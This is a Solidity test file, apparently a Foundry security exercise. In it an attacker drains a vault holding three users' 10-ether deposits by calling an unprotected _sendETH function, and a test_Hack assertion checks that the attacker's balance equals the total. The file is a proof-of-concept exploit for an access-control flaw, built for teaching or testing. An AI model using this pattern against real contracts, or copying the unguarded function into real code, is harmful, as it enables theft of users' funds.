// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IProtocolVault {
    function _sendETH(address to) external;
    function owner() external view returns (address);
    function withdrawETH() external;
}

contract TestAC1 is Test {
    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    IProtocolVault protocolVault;

    uint256 constant USER_DEPOSIT = 10 ether;

    function setUp() public {
        vm.deal(user1, USER_DEPOSIT);
        vm.deal(user2, USER_DEPOSIT);
        vm.deal(user3, USER_DEPOSIT);

        vm.prank(deployer);
        address payable _protocolVault = payable(deployCode("ProtocolVault.sol"));
        protocolVault = IProtocolVault(_protocolVault);

        vm.prank(user1);
        (bool sent1,) = address(protocolVault).call{value: USER_DEPOSIT}("");
        require(sent1, "User1 Transfer failed");

        vm.prank(user2);
        (bool sent2,) = address(protocolVault).call{value: USER_DEPOSIT}("");
        require(sent2, "User1 Transfer failed");

        vm.prank(user3);
        (bool sent3,) = address(protocolVault).call{value: USER_DEPOSIT}("");
        require(sent3, "User1 Transfer failed");

        assertEq(address(protocolVault).balance, USER_DEPOSIT * 3);
    }

    function test_Hack() public {
        vm.prank(attacker);
        protocolVault._sendETH(attacker);

        assertEq(attacker.balance, USER_DEPOSIT * 3);
    }
}
